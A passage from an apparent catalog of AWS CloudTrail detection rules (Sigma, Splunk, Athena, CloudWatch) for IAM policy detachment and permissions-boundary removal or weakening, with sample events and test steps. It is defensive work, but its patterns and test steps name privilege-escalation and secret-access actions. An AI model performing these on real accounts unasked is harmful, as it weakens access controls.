      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn, requestParameters.policyName
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('DetachUserPolicy', 'DetachRolePolicy', 'DeleteUserPolicy', 'DeleteRolePolicy')
  AND (
    requestParameters.policyArn LIKE '%Deny%' OR requestParameters.policyArn LIKE '%Restrict%' OR requestParameters.policyArn LIKE '%Boundary%' OR requestParameters.policyArn LIKE '%ReadOnly%' OR requestParameters.policyArn LIKE '%Limited%'
    OR requestParameters.policyName LIKE '%Deny%' OR requestParameters.policyName LIKE '%Restrict%' OR requestParameters.policyName LIKE '%Boundary%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn, requestParameters.policyName
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["DetachUserPolicy", "DetachRolePolicy", "DeleteUserPolicy", "DeleteRolePolicy"]
| filter requestParameters.policyArn like /Deny|Restrict|Boundary|ReadOnly|Limited/ or requestParameters.policyName like /Deny|Restrict|Boundary/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["DetachUserPolicy", "DetachRolePolicy", "DeleteUserPolicy", "DeleteRolePolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "requestParameters.policyArn", "requestParameters.policyName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "DetachUserPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "TargetUser", policyArn: "arn:aws:iam::123456789012:policy/DenyS3Delete" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who removed the restrictive policy.", "Verify if the policy was a deny policy or permission boundary.", "Assess the impact on the principal's effective permissions.", "Check whether the removal was authorized."],
    testingSteps: ["Detach a policy with Deny or Restrict in the name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-040",
    title: "Policy Removal by Unexpected Actor",
    description: "Detects policy detach or delete performed by identities that normally should not modify IAM permissions. Suspicious actors include IAM users, application roles, EC2 roles, and assumed roles outside IAM administration.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Policy Detach", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DevOps or automation roles", "IAM admin users with expected access"],
    rules: {
      sigma: `title: Policy Removal by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - DetachUserPolicy
      - DetachRolePolicy
      - DeleteUserPolicy
      - DeleteRolePolicy
  filter_known_admin:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'IAMAdmin'
  condition: selection and not filter_known_admin
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=DetachUserPolicy OR eventName=DetachRolePolicy OR eventName=DeleteUserPolicy OR eventName=DeleteRolePolicy)
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%IAMAdmin%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('DetachUserPolicy', 'DetachRolePolicy', 'DeleteUserPolicy', 'DeleteRolePolicy')
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%IAMAdmin%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["DetachUserPolicy", "DetachRolePolicy", "DeleteUserPolicy", "DeleteRolePolicy"]
| filter userIdentity.principalId not like /terraform/ and userIdentity.principalId not like /cloudformation/ and userIdentity.arn not like /admin/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["DetachUserPolicy", "DetachRolePolicy", "DeleteUserPolicy", "DeleteRolePolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.roleName", "requestParameters.userName", "requestParameters.policyArn", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "DetachUserPolicy", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/app-role/i-xxx" }, requestParameters: { userName: "TargetUser", policyArn: "arn:aws:iam::aws:policy/ReadOnlyAccess" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type (IAMUser, AssumedRole) and ARN.", "Verify if this identity is authorized to detach or delete IAM policies.", "Check userIdentity.sessionContext.sessionIssuer.arn for assumed roles.", "Review whether the actor is an EC2 instance role or application role."],
    testingSteps: ["As a non-admin role, call DetachUserPolicy or DeleteUserPolicy.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },

  // --- IAM Permissions Boundary Deletion ---
  {
    id: "det-041",
    title: "Permissions Boundary Removed",
    description: "Baseline visibility when a permissions boundary is deleted from a role or user. Important and potentially dangerous, but may occur during legitimate identity management or delegated administration.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "Permissions Boundary", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate boundary lifecycle management", "Terraform/CloudFormation"],
    rules: {
      sigma: `title: Permissions Boundary Removed
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - DeleteRolePermissionsBoundary
      - DeleteUserPermissionsBoundary
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=DeleteRolePermissionsBoundary OR eventName=DeleteUserPermissionsBoundary)
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('DeleteRolePermissionsBoundary', 'DeleteUserPermissionsBoundary')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["DeleteRolePermissionsBoundary", "DeleteUserPermissionsBoundary"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["DeleteRolePermissionsBoundary", "DeleteUserPermissionsBoundary"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "DeleteRolePermissionsBoundary", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who removed the boundary.", "Verify target principal's attached policies and whether boundary removal expands permissions.", "Check if the change was authorized."],
    testingSteps: ["Call DeleteRolePermissionsBoundary or DeleteUserPermissionsBoundary.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-042",
    title: "Suspicious Permissions Boundary Removal by Unexpected Actor",
    description: "Detects boundary deletion performed by identities that normally should not manage IAM boundaries. Suspicious actors include IAM users, application roles, EC2 instance roles, and assumed roles outside known IAM administration or infrastructure automation. Excludes Terraform, CloudFormation, and admin roles.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Permissions Boundary", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DevOps or automation roles", "IAM admin users with expected access"],
    rules: {
      sigma: `title: Suspicious Permissions Boundary Removal by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - DeleteRolePermissionsBoundary
      - DeleteUserPermissionsBoundary
  filter_known_admin:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'IAMAdmin'
  condition: selection and not filter_known_admin
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=DeleteRolePermissionsBoundary OR eventName=DeleteUserPermissionsBoundary)
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%IAMAdmin%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('DeleteRolePermissionsBoundary', 'DeleteUserPermissionsBoundary')
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%IAMAdmin%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["DeleteRolePermissionsBoundary", "DeleteUserPermissionsBoundary"]
| filter userIdentity.principalId not like /terraform/ and userIdentity.principalId not like /cloudformation/ and userIdentity.arn not like /admin/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["DeleteRolePermissionsBoundary", "DeleteUserPermissionsBoundary"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.roleName", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "DeleteRolePermissionsBoundary", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/app-role/i-xxx" }, requestParameters: { roleName: "TargetRole" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized to manage IAM boundaries.", "Check sessionContext.sessionIssuer.arn for assumed roles."],
    testingSteps: ["As a non-admin role, call DeleteRolePermissionsBoundary.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },
  {
    id: "det-043",
    title: "Boundary Removal Followed by Sensitive Activity",
    description: "Correlates boundary deletion with follow-on privileged activity within 5–15 minutes. Reduces false positives by requiring suspicious follow-on behavior. Same actor or affected principal performs AssumeRole, CreateAccessKey, AttachUserPolicy, PutUserPolicy, PutRolePolicy, GetSecretValue, KMS decrypt, or broad S3 access.",
    awsService: "IAM",
    relatedServices: ["STS", "Secrets Manager", "KMS", "S3"],
    severity: "Critical",
    tags: ["IAM", "Permissions Boundary", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate boundary removal followed by normal admin workflow"],
    rules: {
      sigma: `title: Boundary Removal Followed by Sensitive Activity
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_boundary:
    eventSource: iam.amazonaws.com
    eventName:
      - DeleteRolePermissionsBoundary
      - DeleteUserPermissionsBoundary
  selection_sensitive:
    eventName:
      - AssumeRole
      - CreateAccessKey
      - AttachUserPolicy
      - AttachRolePolicy
      - PutUserPolicy
      - PutRolePolicy
      - GetSecretValue
      - Decrypt
  condition: 1 of selection_*
level: critical
# Full correlation (same actor, 5–15 min window) requires SIEM correlation.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=iam.amazonaws.com AND (eventName=DeleteRolePermissionsBoundary OR eventName=DeleteUserPermissionsBoundary))
   OR (eventName=AssumeRole OR eventName=CreateAccessKey OR eventName=AttachUserPolicy OR eventName=AttachRolePolicy OR eventName=PutUserPolicy OR eventName=PutRolePolicy OR eventName=GetSecretValue OR eventName=Decrypt))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| transaction actor maxspan=15m
| where mvcount(mvfilter(eventSource="iam.amazonaws.com" AND eventName IN ("DeleteRolePermissionsBoundary","DeleteUserPermissionsBoundary")))>0
  AND mvcount(mvfilter(eventName IN ("AssumeRole","CreateAccessKey","AttachUserPolicy","AttachRolePolicy","PutUserPolicy","PutRolePolicy","GetSecretValue","Decrypt")))>0
| table _time, actor, eventName, requestParameters.roleName, requestParameters.userName`,
      cloudtrail: `WITH boundary_removal AS (
  SELECT userIdentity.arn AS actor, eventTime AS removal_time
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName IN ('DeleteRolePermissionsBoundary', 'DeleteUserPermissionsBoundary')
),
sensitive_use AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('AssumeRole', 'CreateAccessKey', 'AttachUserPolicy', 'AttachRolePolicy', 'PutUserPolicy', 'PutRolePolicy', 'GetSecretValue', 'Decrypt')
)
SELECT b.actor, b.removal_time, s.use_time, s.eventName
FROM boundary_removal b
JOIN sensitive_use s ON b.actor = s.actor
  AND s.use_time > b.removal_time
  AND s.use_time <= b.removal_time + INTERVAL '15' MINUTE
ORDER BY b.removal_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource
| filter (eventSource = "iam.amazonaws.com" and eventName in ["DeleteRolePermissionsBoundary", "DeleteUserPermissionsBoundary"])
  or eventName in ["AssumeRole", "CreateAccessKey", "AttachUserPolicy", "AttachRolePolicy", "PutUserPolicy", "PutRolePolicy", "GetSecretValue", "Decrypt"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["DeleteRolePermissionsBoundary", "DeleteUserPermissionsBoundary"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "DeleteRolePermissionsBoundary", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor that removed the boundary.", "Review the sequence: boundary removal → sensitive API use within 15 minutes.", "Verify if the follow-on activity was expected.", "Assess whether the principal was newly unconstrained."],
    testingSteps: ["Call DeleteRolePermissionsBoundary, then within 15 min call AssumeRole or GetSecretValue.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- IAM Permissions Boundary Weakening ---
  {
    id: "det-044",
    title: "Permissions Boundary Changed",
    description: "Baseline visibility for any boundary change on a user or role. Boundary changes are high-sensitivity IAM events but can be legitimate.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "Permissions Boundary", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate boundary updates", "Terraform/CloudFormation"],
    rules: {
      sigma: `title: Permissions Boundary Changed
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePermissionsBoundary
      - PutUserPermissionsBoundary
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=PutRolePermissionsBoundary OR eventName=PutUserPermissionsBoundary)
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('PutRolePermissionsBoundary', 'PutUserPermissionsBoundary')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "requestParameters.permissionsBoundary", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePermissionsBoundary", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole", permissionsBoundary: "arn:aws:iam::aws:policy/ExampleBoundary" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who changed the boundary.", "Inspect the new boundary ARN.", "Verify if the change was authorized."],
    testingSteps: ["Call PutRolePermissionsBoundary.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-045",
    title: "Boundary Changed to Non-Approved Policy ARN",
    description: "Detects boundary changes to a policy ARN outside the organization's approved boundary allowlist. In real environments, permissions boundaries are usually tightly standardized. Deviating from approved boundary ARNs is suspicious. Implement allowlist logic: alert when requestParameters.permissionsBoundary is not in the approved list.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Permissions Boundary", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["New approved boundary added to allowlist", "Legitimate boundary migration"],
    rules: {
      sigma: `title: Boundary Changed to Non-Approved Policy ARN
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePermissionsBoundary
      - PutUserPermissionsBoundary
  filter_non_approved:
    requestParameters.permissionsBoundary|contains:
      - 'aws:policy/AdministratorAccess'
      - 'aws:policy/PowerUserAccess'
      - 'FullAccess'
      - 'Admin'
  condition: selection and filter_non_approved
level: high
# Customize filter_non_approved: invert to allowlist approved ARNs if supported.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=PutRolePermissionsBoundary OR eventName=PutUserPermissionsBoundary)
| where like(requestParameters.permissionsBoundary, "%AdministratorAccess%") OR like(requestParameters.permissionsBoundary, "%PowerUserAccess%") OR like(requestParameters.permissionsBoundary, "%FullAccess%") OR like(requestParameters.permissionsBoundary, "%Admin%")
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('PutRolePermissionsBoundary', 'PutUserPermissionsBoundary')
  AND (requestParameters.permissionsBoundary LIKE '%AdministratorAccess%' OR requestParameters.permissionsBoundary LIKE '%PowerUserAccess%' OR requestParameters.permissionsBoundary LIKE '%FullAccess%' OR requestParameters.permissionsBoundary LIKE '%Admin%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"]
| filter requestParameters.permissionsBoundary like /AdministratorAccess|PowerUserAccess|FullAccess|Admin/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.permissionsBoundary", "requestParameters.roleName", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePermissionsBoundary", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole", permissionsBoundary: "arn:aws:iam::aws:policy/AdministratorAccess" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who set the boundary.", "Verify if the boundary ARN is in the approved allowlist.", "Assess whether the new boundary weakens restrictions."],
    testingSteps: ["Set a boundary to a non-approved policy ARN.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-046",
    title: "Boundary Change on Sensitive Principal",
    description: "Detects boundary changes applied to highly sensitive users or roles. Sensitive targets include admin roles, break-glass roles, deployment roles, platform roles, and privileged human users. Even a legitimate-looking boundary change is risky on critical identities.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Permissions Boundary", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Planned boundary change on critical role", "Break-glass procedure"],
    rules: {
      sigma: `title: Boundary Change on Sensitive Principal
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePermissionsBoundary
      - PutUserPermissionsBoundary
  filter_role:
    requestParameters.roleName|contains:
      - 'admin'
      - 'Admin'
      - 'break-glass'
      - 'deploy'
      - 'platform'
  filter_user:
    requestParameters.userName|contains:
      - 'admin'
      - 'Admin'
      - 'break-glass'
      - 'deploy'
      - 'platform'
  condition: selection and (filter_role or filter_user)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=PutRolePermissionsBoundary OR eventName=PutUserPermissionsBoundary)
| where like(requestParameters.roleName, "%admin%") OR like(requestParameters.roleName, "%Admin%") OR like(requestParameters.roleName, "%break-glass%") OR like(requestParameters.roleName, "%deploy%") OR like(requestParameters.roleName, "%platform%") OR like(requestParameters.userName, "%admin%") OR like(requestParameters.userName, "%Admin%") OR like(requestParameters.userName, "%break-glass%") OR like(requestParameters.userName, "%deploy%") OR like(requestParameters.userName, "%platform%")
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('PutRolePermissionsBoundary', 'PutUserPermissionsBoundary')
  AND (requestParameters.roleName LIKE '%admin%' OR requestParameters.roleName LIKE '%Admin%' OR requestParameters.roleName LIKE '%break-glass%' OR requestParameters.roleName LIKE '%deploy%' OR requestParameters.roleName LIKE '%platform%' OR requestParameters.userName LIKE '%admin%' OR requestParameters.userName LIKE '%Admin%' OR requestParameters.userName LIKE '%break-glass%' OR requestParameters.userName LIKE '%deploy%' OR requestParameters.userName LIKE '%platform%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.permissionsBoundary
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"]
| filter requestParameters.roleName like /admin|break-glass|deploy|platform/i or requestParameters.userName like /admin|break-glass|deploy|platform/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePermissionsBoundary", "PutUserPermissionsBoundary"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "requestParameters.permissionsBoundary", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePermissionsBoundary", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole", permissionsBoundary: "arn:aws:iam::aws:policy/ExampleBoundary" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the target principal and whether it is sensitive.", "Verify if the boundary change was authorized.", "Assess impact on the principal's effective permissions."],
    testingSteps: ["Set a boundary on a role with 'admin' in the name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-047",
    title: "Boundary Change Followed by Privileged or Sensitive Action",
    description: "Correlates boundary update with immediate privileged use. Attackers weaken a boundary to immediately use broader permissions. Follow-on events: AssumeRole, CreatePolicyVersion, SetDefaultPolicyVersion, PassRole, GetSecretValue, Decrypt, broad S3 access.",
    awsService: "IAM",
    relatedServices: ["STS", "Secrets Manager", "KMS", "S3"],
    severity: "Critical",
    tags: ["IAM", "Permissions Boundary", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate boundary change followed by normal admin workflow"],
    rules: {
      sigma: `title: Boundary Change Followed by Privileged or Sensitive Action
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_boundary:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePermissionsBoundary
      - PutUserPermissionsBoundary
  selection_sensitive:
    eventName:
      - AssumeRole
      - CreatePolicyVersion
      - SetDefaultPolicyVersion
      - PassRole
      - GetSecretValue
      - Decrypt
  condition: 1 of selection_*
level: critical
# Full correlation requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=iam.amazonaws.com AND (eventName=PutRolePermissionsBoundary OR eventName=PutUserPermissionsBoundary))
   OR (eventName=AssumeRole OR eventName=CreatePolicyVersion OR eventName=SetDefaultPolicyVersion OR eventName=PassRole OR eventName=GetSecretValue OR eventName=Decrypt))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| transaction actor maxspan=15m
| where mvcount(mvfilter(eventSource="iam.amazonaws.com" AND eventName IN ("PutRolePermissionsBoundary","PutUserPermissionsBoundary")))>0
  AND mvcount(mvfilter(eventName IN ("AssumeRole","CreatePolicyVersion","SetDefaultPolicyVersion","PassRole","GetSecretValue","Decrypt")))>0
| table _time, actor, eventName, requestParameters.roleName, requestParameters.userName`,
      cloudtrail: `WITH boundary_change AS (
  SELECT userIdentity.arn AS actor, eventTime AS change_time
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName IN ('PutRolePermissionsBoundary', 'PutUserPermissionsBoundary')
),
